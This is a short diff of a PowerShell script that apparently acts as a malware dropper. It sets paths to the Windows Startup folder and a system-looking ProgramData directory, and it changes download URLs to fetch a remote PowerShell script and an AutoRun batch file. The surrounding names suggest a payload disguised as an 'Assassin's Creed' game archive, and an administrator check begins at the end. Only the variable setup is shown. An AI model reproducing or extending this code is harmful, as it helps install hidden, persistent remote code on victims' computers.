@@ -19,8 +19,8 @@ Set-Variable -Name zipFilePath -Value ("$env:TEMP")
 Set-Variable -Name donor -Value ("C:\ProgramData\Microsoft\Windows")
 Set-Variable -Name Autorun -Value ("C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
 Set-Variable -Name zipUrl -Value ("https://github.com/P0k3m0n-unleashed/ProjSucc/raw/refs/heads/master/Venom/AssassinsCreed_SE.zip")
-Set-Variable -Name donorUrl -Value ("https://github.com/P0k3m0n-unleashed/ProjSucc/raw/refs/heads/master/Venom/AssassinsCreed_SE.zip")
-Set-Variable -Name AutorunUrl -Value ("https://github.com/P0k3m0n-unleashed/ProjSucc/raw/refs/heads/master/Venom/AssassinsCreed_SE.zip")
+Set-Variable -Name donorUrl -Value ("https://raw.githubusercontent.com/Drakovthe6th/TBuG/refs/heads/master/p_vba.ps1")
+Set-Variable -Name AutorunUrl -Value ("https://raw.githubusercontent.com/Drakovthe6th/TBuG/refs/heads/master/AutoRun.bat")
 
 Set-Variable -Name desktopPath -Value ([Environment]::GetFolderPath("Desktop"))
 function Test-IsAdmin {
